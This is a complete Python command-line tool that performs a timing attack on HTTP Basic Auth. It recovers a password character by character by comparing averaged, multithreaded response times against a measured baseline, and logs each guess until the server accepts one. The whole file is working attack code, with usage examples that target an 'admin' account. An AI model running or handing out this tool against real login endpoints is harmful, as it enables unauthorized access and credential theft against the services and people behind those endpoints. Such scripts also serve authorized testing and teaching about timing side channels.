import argparse
import requests
import time
import statistics
import string
import concurrent.futures

def log(msg, log_file):
    print(msg)
    with open(log_file, "a") as f:
        f.write(msg + "\n")

def measure_time(url, username, guess):
    start = time.time()
    response = requests.get(url, auth=(username, guess))
    elapsed = time.time() - start
    return elapsed, response.status_code

def avg_time_for_char(url, username, base_password, char, samples, threads):
    guess = base_password + char

    def task():
        elapsed, _ = measure_time(url, username, guess)
        return elapsed

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        times = list(executor.map(lambda _: task(), range(samples)))

    return statistics.mean(times)

def main():
    epilog_text = """
Example Usage:
  python attack.py -l http://target/auth -u admin -s p4 -n 5 -t 10 -c abcdef1234 -f log.txt

This tool performs a timing attack on an HTTP Basic Auth endpoint.
It uses multiple samples and threads to detect timing differences
in password character matching.
    """

    parser = argparse.ArgumentParser(
        description="HTTP Basic Auth Timing Attack Tool",
        epilog=epilog_text,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-l", "--url", required=True, help="Target URL")
    parser.add_argument("-s", "--start", default="", help="Known start of the password")
    parser.add_argument("-c", "--charset", default=string.printable, help="Character set to try")
    parser.add_argument("-n", "--samples", type=int, default=5, help="Number of timing samples per character")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads")
    parser.add_argument("-f", "--log", default="attack_log.txt", help="Log file name")

    args = parser.parse_args()

    with open(args.log, "w") as f:
        f.write("=== Timing Attack Log ===\n")

    log("[*] Measuring baseline response time...", args.log)
    baseline_times = []
    fake_guess = args.start + "#"
    for _ in range(10):
        t, _ = measure_time(args.url, args.username, fake_guess)
        baseline_times.append(t)

    baseline = statistics.mean(baseline_times)
    stddev = statistics.stdev(baseline_times)
    threshold = baseline + 2 * stddev

    log(f"[*] Baseline: {baseline:.4f}s | StdDev: {stddev:.4f}s | Threshold: {threshold:.4f}s\n", args.log)

    password = args.start
    while True:
        found_char = False
        for char in args.charset:
            guess = password + char
            avg_elapsed = avg_time_for_char(args.url, args.username, password, char, args.samples, args.threads)
            _, status_code = measure_time(args.url, args.username, guess)

            log(f"Trying: '{guess}' | Avg Time: {avg_elapsed:.4f}s", args.log)

            if status_code == 200:
                log(f"\n[+] SUCCESS! Password is: {guess}", args.log)
                return

            if avg_elapsed > threshold:
                log(f"--> '{char}' is likely correct (avg time = {avg_elapsed:.4f}s)\n", args.log)
                password += char
                found_char = True
                break

        if not found_char:
            log("[!] No likely character found. Stopping.", args.log)
            break

if __name__ == "__main__":
    main()
